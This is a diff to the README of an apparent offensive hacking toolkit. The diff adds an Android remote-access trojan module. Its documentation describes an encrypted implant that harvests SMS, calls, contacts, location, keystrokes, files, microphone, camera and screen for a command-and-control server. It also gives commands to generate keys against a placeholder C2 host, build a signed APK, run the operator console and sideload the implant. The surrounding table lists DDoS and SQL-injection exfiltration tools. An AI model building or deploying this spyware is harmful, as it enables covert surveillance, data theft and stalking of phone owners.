@@ -1086,6 +1086,7 @@ Global flags: `--proxy URL`, `--no-verify`, `--no-banner`, `--verbose`, `--versi
 | `dirfinder` | Hidden directory and file discovery engine |
 | `ddos` | Authorized resilience testing — scoped, capped, audited (HTTP via Go, TCP via C) |
 | `wireless` | Interactive wireless auditing console |
+| `rat` | Android RAT bench: `doctor`, `keygen`, `build`, `serve`, `console`, `send`, `dump` |
 | `config` | Terminal theme, user, host, colors, prompt (15 themes) |
 | `examples` | Copy paste usage examples for every tool |
 | `help-tools` | Short quick reference of the most used tools |
@@ -1099,6 +1100,22 @@ Global flags: `--proxy URL`, `--no-verify`, `--no-banner`, `--verbose`, `--versi
 Detect first with `scan`, enumerate with `tables` and `columns`,
 exfiltrate with `dump` or `extract`, escalate with `exec`, `priv`,
 `network`, and document with `report`.
+
+### Android RAT (`hackit rat`)
+
+Encrypted Android implant (API 21–35) with a Python C2: SMS, calls, contacts,
+location, notifications, keylog, clipboard, files, mic, camera, screen, apps.
+Every payload is sealed with AES-256-GCM over an HKDF-derived PSK.
+
+```bash
+hackit rat doctor                                  # JDK + SDK + build-tools
+hackit rat keygen --host https://c2.example.com    # PSK + agent.json
+hackit rat build --config ~/.hackit/rat/agent.json # signed APK
+hackit rat console                                 # C2 + operator shell
+adb install -r ~/.hackit/rat/build/<stamp>/agent-signed.apk
+```
+
+Module details: `hackit/rat/README.md`.
 
 ### Common recipes
 
